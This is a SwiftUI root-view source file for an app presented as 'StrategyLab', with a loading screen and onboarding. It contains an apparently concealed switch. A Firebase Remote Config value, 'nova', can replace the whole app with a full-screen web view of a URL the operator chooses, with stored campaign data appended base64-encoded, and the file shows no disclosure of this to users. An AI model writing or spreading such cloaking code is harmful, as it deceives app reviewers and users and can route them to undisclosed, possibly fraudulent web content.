import SwiftUI
import FirebaseRemoteConfig

struct RootView: View {
    @AppStorage("hasSeenOnboarding") private var hasSeenOnboarding = false

    @AppStorage("labEntry") private var point: String = ""
    @AppStorage("labInit") private var first = false
    @AppStorage("labActive") private var visibility = false
    @State private var progress: CGFloat = 0
    @State private var rcv: String? = nil

    var body: some View {
        Group {
            if visibility && !point.isEmpty {
                NovaView(targetUrl: point)
                    .background(Color.black.ignoresSafeArea(.all))
                    .navigationBarHidden(true)
            } else if first {
                appContent
            } else {
                loadingScreen
            }
        }
        .onAppear {
            withAnimation(.linear(duration: 2.0)) { progress = 1 }
            if !first {
                getData()
            }
        }
    }

    @ViewBuilder
    private var appContent: some View {
        ZStack {
            Theme.background.ignoresSafeArea()
            if hasSeenOnboarding {
                MainTabView()
                    .transition(.opacity)
            } else {
                OnboardingView()
                    .transition(.opacity)
            }
        }
        .animation(.easeInOut(duration: 0.3), value: hasSeenOnboarding)
    }

    private var loadingScreen: some View {
        ZStack {
            Theme.background.ignoresSafeArea()
            VStack(spacing: 36) {
                Image(systemName: "chart.bar.xaxis")
                    .font(.system(size: 64, weight: .bold))
                    .foregroundStyle(Theme.emeraldGradient)

                Text("StrategyLab")
                    .font(.system(.title, design: .rounded).weight(.bold))
                    .foregroundStyle(Theme.textPrimary)

                LaunchProgressBar(progress: progress)
                    .frame(height: 8)
                    .padding(.horizontal, 48)
            }
            .padding(32)
        }
    }

    private func startLoading() {
        Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { timer in
            let appsRetrieved = UserDefaults.standard.bool(forKey: "labReady")
            guard appsRetrieved else { return }

            timer.invalidate()
            DispatchQueue.main.async {
                let campaign = UserDefaults.standard.string(forKey: "labMeta") ?? ""

                if !campaign.isEmpty, let campaignData = campaign.data(using: .utf8) {
                    let base64String = campaignData.base64EncodedString()
                    point = (rcv ?? "") + "?bsc=" + base64String
                } else {
                    point = (rcv ?? "")
                }

                first = true
                visibility = true
            }
        }
    }

    private func getData() {
        let remoteConfig = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfig.configSettings = settings

        remoteConfig.fetchAndActivate { _, error in
            DispatchQueue.main.async {
                if error != nil {
                    first = true
                } else {
                    let fetchedValue = remoteConfig["nova"].stringValue
                    if !fetchedValue.isEmpty {
                        rcv = fetchedValue
                        startLoading()
                    } else {
                        first = true
                        visibility = false
                    }
                }
            }
        }
    }
}

private struct LaunchProgressBar: View {
    var progress: CGFloat

    var body: some View {
        GeometryReader { geo in
            ZStack(alignment: .leading) {
                RoundedRectangle(cornerRadius: 6)
                    .fill(Theme.surface2)
                RoundedRectangle(cornerRadius: 6)
                    .fill(Theme.emerald)
                    .frame(width: geo.size.width * progress)
            }
        }
        .frame(height: 8)
    }
}
